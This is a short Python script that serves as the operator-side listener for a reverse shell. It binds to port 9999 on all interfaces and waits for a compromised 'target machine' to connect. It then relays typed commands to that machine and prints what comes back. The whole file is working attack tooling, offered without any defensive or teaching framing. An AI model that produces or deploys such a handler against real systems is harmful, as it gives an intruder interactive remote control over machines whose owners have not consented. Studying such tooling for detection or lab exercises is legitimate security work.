import socket

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 9999        # Same port as in the reverse shell script

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)
print(f"Listening on {HOST}:{PORT}...")

client_socket, client_address = server_socket.accept()
print(f"Connection from {client_address} established!")

while True:
    # Get a command from the user to send to the target machine
    command = input("Shell> ")
    if command.lower() == 'exit':
        client_socket.sendall(b'exit')
        client_socket.close()
        break
    
    client_socket.sendall(command.encode('utf-8'))
    output = client_socket.recv(4096)
    print(output.decode('utf-8'))
